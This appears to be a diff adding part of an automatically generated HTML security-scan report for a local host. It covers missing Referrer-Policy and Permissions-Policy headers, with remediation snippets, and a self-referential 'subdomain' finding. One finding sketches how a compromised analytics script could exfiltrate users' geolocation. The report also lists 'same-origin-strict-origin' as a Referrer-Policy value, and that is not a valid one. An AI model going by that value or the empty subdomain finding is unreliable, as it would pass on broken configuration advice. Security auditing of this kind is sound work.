+<p><em>1 evidence record(s). See <code>evidence/WPOC-7D85A3-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Set `Referrer-Policy: strict-origin-when-cross-origin` (modern default) or stricter: `same-origin`, `no-referrer`, or `same-origin-strict-origin`.</li>
+<li>Avoid putting secrets in URLs altogether — use POST bodies for sensitive state.</li>
+<li>Audit existing usage of `unsafe-url` and `no-referrer-when-downgrade` in legacy configurations.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+add_header Referrer-Policy &quot;strict-origin-when-cross-origin&quot; always;
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+Header always set Referrer-Policy &quot;strict-origin-when-cross-origin&quot;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+app.use((req, res, next) =&gt; {
+  res.setHeader(&#x27;Referrer-Policy&#x27;, &#x27;strict-origin-when-cross-origin&#x27;);
+  next();
+});
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+@app.after_request
+def set_rp(resp):
+    resp.headers[&#x27;Referrer-Policy&#x27;] = &#x27;strict-origin-when-cross-origin&#x27;
+    return resp
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+SECURE_REFERRER_POLICY = &#x27;strict-origin-when-cross-origin&#x27;
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/693.html" target="_blank" rel="noopener">CWE-693</a></li>
+<li>OWASP A05:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-C9BD15">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#16a34a;">Low</span>
+<h3>Missing Permissions-Policy Header</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-C9BD15</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>GET http://127.0.0.1/</code>
+<br><strong>Parameter:</strong> <code>permissions-policy</code>
+<br><strong>Input used:</strong> <code>(not set)</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>The Permissions-Policy header is not set, allowing all embedded iframes, scripts, and images full access to powerful browser APIs such as camera, microphone, geolocation, and USB. While the policy is opt-in rather than blocking, its absence means a third-party script can quietly request access without your site&#x27;s consent.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Permissions-Policy (formerly Feature-Policy) is a response header that lets a site declare which browser features are allowed for the page and for any embedded content. Examples: `camera=(), microphone=(), geolocation=(self), usb=()`. When absent, the browser default is to permit everything. A third-party analytics script or ad tag can request `navigator.mediaDevices.getUserMedia()` without the host page&#x27;s explicit policy, and the browser will prompt the user (or silently allow in some legacy contexts).</p>
+</section>
+<details class="attack-scenario" open>
+<summary><h4 style="display:inline;">Attack scenario</h4></summary>
+<ol class="attack-steps">
+<li>Application includes a third-party analytics script (analytics.example.com)</li>
+<li>analytics.example.com is compromised or rebranded into a malicious network</li>
+<li>Malicious script calls `navigator.geolocation.getCurrentPosition()` and exfiltrates the user&#x27;s coordinates</li>
+<li>Or calls `navigator.usb.requestDevice()` to enumerate connected USB devices</li>
+<li>With `Permissions-Policy: geolocation=(), camera=()` set, the browser blocks these APIs entirely for the page and any embedded content</li>
+</ol>
+</details>
+<section>
+<h4>Impact</h4>
+<p>Reduced control over which browser features are exposed to first-party code, embedded iframes, and third-party scripts. Particularly relevant for sites serving content from ad networks, embedded videos, or chat widgets. Defense in depth: if a third-party tag is compromised, Permissions-Policy limits the blast radius.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-C9BD15-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Add a Permissions-Policy header that disables features you do not use: `Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), payment=()`. Allow specific origins only for the features you need: `geolocation=(self)`.</li>
+<li>Audit embedded third-party scripts and tags; tighten policies to limit what each embedded origin can do.</li>
+<li>Test changes incrementally — some legacy code may rely on a feature you decide to disable.</li>
+</ol>
+</section>
+<details class="code-examples" open>
+<summary><h4 style="display:inline;">Code examples</h4></summary>
+<h5>nginx</h5>
+<pre class="code-block"><code>
+add_header Permissions-Policy &quot;camera=(), microphone=(), geolocation=(), usb=()&quot; always;
+</code></pre>
+<h5>apache</h5>
+<pre class="code-block"><code>
+Header always set Permissions-Policy &quot;camera=(), microphone=(), geolocation=()&quot;
+</code></pre>
+<h5>express</h5>
+<pre class="code-block"><code>
+app.use((req, res, next) =&gt; {
+  res.setHeader(
+    &#x27;Permissions-Policy&#x27;,
+    &#x27;camera=(), microphone=(), geolocation=()&#x27;
+  );
+  next();
+});
+</code></pre>
+<h5>flask</h5>
+<pre class="code-block"><code>
+@app.after_request
+def set_pp(resp):
+    resp.headers[&#x27;Permissions-Policy&#x27;] = &#x27;camera=(), microphone=()&#x27;
+    return resp
+</code></pre>
+<h5>django</h5>
+<pre class="code-block"><code>
+# No built-in setting; use middleware:
+response[&#x27;Permissions-Policy&#x27;] = &#x27;camera=(), microphone=()&#x27;
+</code></pre>
+</details>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li><a href="https://cwe.mitre.org/data/definitions/693.html" target="_blank" rel="noopener">CWE-693</a></li>
+<li>OWASP A05:2021</li>
+</ul>
+</section>
+</div>
+</article>
+<article class="finding" id="finding-WPOC-64D77C">
+<header>
+<div class="finding-title">
+<span class="sev-badge" style="background:#2563eb;">Info</span>
+<h3>Subdomain Discovered: 127.0.0.1</h3>
+</div>
+<div class="finding-meta">
+<span class="meta-item"><strong>ID:</strong> <code>WPOC-64D77C</code></span>
+<span class="meta-item"><strong>Status:</strong> CONFIRMED</span>
+<span class="meta-item"><strong>Confidence:</strong> HIGH</span>
+</div>
+<div class="finding-target">
+<strong>Target:</strong> <code>HEAD https://127.0.0.1/</code>
+<br><strong>Input used:</strong> <code>127.0.0.1</code>
+</div>
+</header>
+<div class="finding-body">
+<section>
+<h4>Summary</h4>
+<p>Discovered subdomain &#x27;127.0.0.1&#x27; of &#x27;127.0.0.1&#x27; while crawling the site. The crawler visited 9 page(s) and inspected 11 URL(s); &#x27;127.0.0.1&#x27; was referenced by one of those URLs.</p>
+</section>
+<section>
+<h4>Technical explanation</h4>
+<p>Root domain: 127.0.0.1. Discovery source: crawl. Hostname observed: 127.0.0.1.</p>
+</section>
+<section>
+<h4>Impact</h4>
+<p>Each discovered subdomain expands the attack surface of the target organization. Subdomains sometimes run outdated software, dev/staging tools, or admin panels with weaker controls than the production site. Even passive discovery (DNS lookup or HEAD probe) is enough to enumerate the surface for follow-up review.</p>
+</section>
+<section>
+<h4>Evidence</h4>
+<p><em>1 evidence record(s). See <code>evidence/WPOC-64D77C-*.txt</code> in the report directory.</em></p>
+</section>
+<section>
+<h4>Steps to reproduce</h4>
+<ol class="reproduction">
+<li>Issue HEAD https://127.0.0.1/ — expect a 2xx/3xx response (proves the host is alive).
+<pre class="code-block"><code>curl -X HEAD https://127.0.0.1/</code></pre>
+</li>
+<li>Confirm the hostname is a subdomain of the target via DNS: dig +short 127.0.0.1
+<pre class="code-block"><code>dig +short 127.0.0.1</code></pre>
+</li>
+</ol>
+</section>
+<section>
+<h4>Remediation</h4>
+<ol class="remediation">
+<li>Maintain an authoritative inventory of all subdomains and decommission anything not actively used.</li>
+<li>Apply the same hardening (HTTPS, headers, auth) to every subdomain, including dev/staging environments.</li>
+<li>Use DNS zone files and certificate-transparency logs to detect subdomain takeover risk before an attacker does.</li>
+</ol>
+</section>
+<section>
+<h4>References</h4>
+<ul class="references">
+<li>OWASP A05:2021</li>
+<li><a href="https://owasp.org/www-project-attack-surface-management/" target="_blank" rel="noopener">https://owasp.org/www-project-attack-surface-management/</a></li>
+</ul>
+</section>
+</div>
+</article>
+</section>
+<footer class="page-footer">
+Generated by <strong>redveil</strong> v0.1.0 &middot; <a href="https://github.com/" target="_blank" rel="noopener">view project</a>
+</footer>
+</div>
+</body>
+</html>
